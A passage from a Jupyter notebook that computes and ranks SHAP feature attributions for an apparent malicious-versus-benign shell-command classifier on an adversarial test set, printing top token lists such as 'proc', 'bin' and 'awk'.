   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Same for _adv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 151,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_top_features(\n",
    "        explanations,\n",
    "        features: list,\n",
    "        which_features: str,\n",
    "        top=10,\n",
    "        round_digits=2\n",
    "):\n",
    "    assert which_features in [\"malicious\", \"benign\", \"abs\"]\n",
    "    if which_features == \"abs\":\n",
    "        mean_shap_values = np.mean(explanations.abs.values, axis=0)\n",
    "    elif isinstance(explanations, np.ndarray):\n",
    "        mean_shap_values = np.mean(explanations, axis=0)\n",
    "    else:\n",
    "        mean_shap_values = np.mean(explanations.values, axis=0)\n",
    "    if which_features in [\"malicious\", \"abs\"]:\n",
    "        top_idx = np.argsort(mean_shap_values)[-top:][::-1]\n",
    "    else:\n",
    "        top_idx = np.argsort(mean_shap_values)[:top]\n",
    "    top_features = {features[idx]: round(mean_shap_values[idx], round_digits) for idx in top_idx}\n",
    "    return top_features\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {},
   "outputs": [],
   "source": [
    "assert X_test_onehot.shape == explanations_adv.values.shape\n",
    "explanations_only_where_token_is_present_adv = explanations_adv.values * X_test_onehot.toarray()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([[ 0.9154148 , -0.33109614, -0.04326066, -0.15568295, -0.36705345],\n",
       "       [-0.61360216, -0.42125472,  0.20505488, -0.2749263 ,  0.7370876 ],\n",
       "       [-0.6389518 , -0.43985483, -0.3717741 , -0.30855045,  0.5059034 ],\n",
       "       [-0.6540051 ,  1.6675261 ,  0.11717444, -0.2749263 ,  0.7370876 ],\n",
       "       [ 0.5608547 , -0.3334814 ,  0.28017348,  2.4943407 , -0.45137486]],\n",
       "      dtype=float32)"
      ]
     },
     "execution_count": 137,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "explanations_adv.values[0:5, 0:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([[0., 1., 1., 1., 0.],\n",
       "       [1., 1., 1., 0., 1.],\n",
       "       [1., 0., 1., 0., 1.],\n",
       "       [1., 1., 0., 0., 1.],\n",
       "       [0., 1., 1., 0., 0.]])"
      ]
     },
     "execution_count": 138,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X_test_onehot.toarray()[0:5, 0:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([[ 0.        , -0.33109614, -0.04326066, -0.15568295, -0.        ],\n",
       "       [-0.61360216, -0.42125472,  0.20505488, -0.        ,  0.73708761],\n",
       "       [-0.63895178, -0.        , -0.37177411, -0.        ,  0.50590342],\n",
       "       [-0.65400511,  1.66752613,  0.        , -0.        ,  0.73708761],\n",
       "       [ 0.        , -0.3334814 ,  0.28017348,  0.        , -0.        ]])"
      ]
     },
     "execution_count": 139,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "explanations_only_where_token_is_present_adv[0:5, 0:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(30000, 4096)"
      ]
     },
     "execution_count": 140,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "explanations_only_where_token_is_present_adv.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(4096,)"
      ]
     },
     "execution_count": 141,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "np.sum(explanations_only_where_token_is_present_adv, axis=0).shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 161,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "14"
      ]
     },
     "execution_count": 161,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "features_adv.index('proc')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 164,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "19244.44766640663"
      ]
     },
     "execution_count": 164,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "explanations_only_where_token_is_present_adv[:, 14].sum()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 163,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.641481588880221"
      ]
     },
     "execution_count": 163,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "np.mean(explanations_only_where_token_is_present_adv, axis=0)[14]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 159,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([ 14,   4,  29,  18, 184,  36,  27,  97,  56,  11], dtype=int64)"
      ]
     },
     "execution_count": 159,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "mean_expl_adv = np.mean(explanations_only_where_token_is_present_adv, axis=0)\n",
    "\n",
    "# idx for top 10 largest features\n",
    "top_idx = np.argsort(mean_expl_adv)[-10:][::-1]\n",
    "top_idx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 160,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'proc'"
      ]
     },
     "execution_count": 160,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "features_adv[14]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 142,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "proc ( 19244.45) & bin ( 11476.98) & 10 ( 5211.67) & = ( 1351.48) & [ ( 716.44) & \", ( 648.3) & 2 ( 462.01) & \"$ ( 350.58) & awk ( 330.61) & 0 ( 298.74)\n"
     ]
    }
   ],
   "source": [
    "malicious_only_where_token_is_present_adv = get_top_features(\n",
    "    explanations_only_where_token_is_present_adv,\n",
    "    features_adv,\n",
    "    \"malicious\",\n",
    "    top=10,\n",
    "    round_digits=2\n",
    ")\n",
    "print(parse_top_features_for_latex(malicious_only_where_token_is_present_adv))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 143,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\" ( -19629.6) & / ( -14398.3) & c ( -9542.53) & \\\\\" ( -5824.4) & - ( -3015.97) & i ( -2823.1) & (\\\\\" ( -1185.52) & . ( -1046.08) & ; ( -787.98) & bash ( -703.2)\n"
     ]
    }
   ],
   "source": [
    "benign_only_where_token_is_present_adv = get_top_features(\n",
    "    explanations_only_where_token_is_present_adv,\n",
    "    features_adv,\n",
    "    \"benign\",\n",
    "    top=10,\n",
    "    round_digits=2\n",
    ")\n",
    "print(parse_top_features_for_latex(benign_only_where_token_is_present_adv))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
